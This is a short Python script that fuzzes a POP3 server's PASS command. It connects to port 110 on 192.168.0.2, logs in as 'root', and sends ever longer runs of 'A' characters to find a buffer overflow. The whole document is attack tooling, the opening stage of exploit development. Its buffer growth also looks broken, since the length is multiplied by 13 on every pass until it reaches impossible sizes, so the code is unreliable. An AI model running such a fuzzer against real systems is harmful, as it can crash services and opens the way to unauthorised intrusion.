#!/usr/bin/python

import socket
buffer = ["A"]
counter = 13
TARGET_IP = "192.168.0.2"
while(len(buffer) <= 30):
    buffer.append("A"*counter)
    counter = counter*13
for  string in buffer:
    print("Fuzzing in PASS with %s bytes" %len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, 110))
    s.recv(1024)
    s.send('USER root \r\n')
    s.recv(1024)
    s.send('PASS'+string+'\r\n')
    s.recv(1024)
    s.send('QUIT \r\n')